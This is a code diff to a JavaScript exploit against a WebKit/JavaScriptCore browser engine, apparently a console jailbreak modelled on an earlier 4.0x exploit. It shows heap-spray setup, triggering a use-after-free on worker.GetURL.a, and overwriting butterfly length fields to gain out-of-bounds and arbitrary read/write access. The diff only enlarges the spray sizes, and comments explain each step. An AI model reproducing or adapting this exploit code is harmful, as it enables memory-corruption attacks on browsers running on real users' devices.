@@ -2,27 +2,27 @@
 // If all else fails, use that second garbage collection function.
 var worker = null;
 // Setup spray to overwrite the length header in the butterfly. Adjust "arrayLength" in these sprays so that no pointers (such as the pointers to the butterfly and JSCell) are overwritten, which would cause a loss of the reference.
-var butterflySpray = new Array(0x1000);
-for (var i = 0; i < 0x1000; i++) {
+var butterflySpray = new Array(0x10000);
+for (var i = 0; i < 0x10000; i++) {
 	butterflySpray[i] = [];
-	for (var k = 0; k < 0x40; k++)
+	for (var k = 0; k < 0x400; k++)
 		butterflySpray[i][k] = 0x41414141;
 	butterflySpray[i].unshift(butterflySpray[i].shift());
 }
 // Spray marked space
-var sprayOne = new Array(0x100);
-for (var i = 0; i < 0x100; i++) {
+var sprayOne = new Array(0x1000);
+for (var i = 0; i < 0x1000; i++) {
 	sprayOne[i] = [1];
 	if (!(i & 3))
-		for (var k = 0; k < 0x8; k++)
+		for (var k = 0; k < 0x80; k++)
 			sprayOne[i][k] = 0x42424242;
 	sprayOne[i].unshift(sprayOne[i].shift());
 }
-var sprayTwo = new Array(0x400);
-for (var i = 0; i < 0x400; i++) {
+var sprayTwo = new Array(0x4000);
+for (var i = 0; i < 0x4000; i++) {
 	sprayTwo[i] = [2];
 	if (!(i & 3))
-		for (var k = 0; k < 0x80; k++)
+		for (var k = 0; k < 0x800; k++)
 			sprayTwo[i][k] = 0x42424242;
 	sprayTwo[i].unshift(sprayTwo[i].shift());
 }
@@ -32,7 +32,7 @@ function start() {
 	var intl = setInterval(function() {
 		// Setup target object for UAF, spray
 		worker.GetURL.a = [];
-		for (var i = 0; i < 0x80; i++)
+		for (var i = 0; i < 0x800; i++)
 			worker.GetURL.a[i] = 0x42420000;
 		window.top.f();
 		clearInterval(intl);
@@ -123,8 +123,8 @@ function callback(ev) {
 	// alert(worker.GetURL.a); UAF here. Presumably, worker.GetURL.a is freed but still has a pointer to its original value (777 from the POC), even though its a dangling pointer. worker.GetURL.a is analogous to uafTarget in qwertyoruiopz's 4.0x exploit.
 	gc();
 	// heap overflow by overwriting the "length" field of the butterfly
-	for (var i = 0; i < 0x1000; i++) {
-		for (var k = 0x0; k < 0x80; k++) {
+	for (var i = 0; i < 0x10000; i++) {
+		for (var k = 0x0; k < 0x800; k++) {
 			butterflySpray[i][k] = 0x7fffffff;
 			// Find the object.
 			if (worker.GetURL.a.length == 0x7fffffff) {
@@ -133,7 +133,7 @@ function callback(ev) {
 				// Remove references
 				for (var i = 0; i < butterflyIndex; i++)
 					butterflySpray[i] = 0;
-				for (var i = butterflyIndex + 1; i < 0x1000; i++)
+				for (var i = butterflyIndex + 1; i < 0x10000; i++)
 					butterflySpray[i] = 0;
 				gc();
 				// Spray for arbitrary r/w
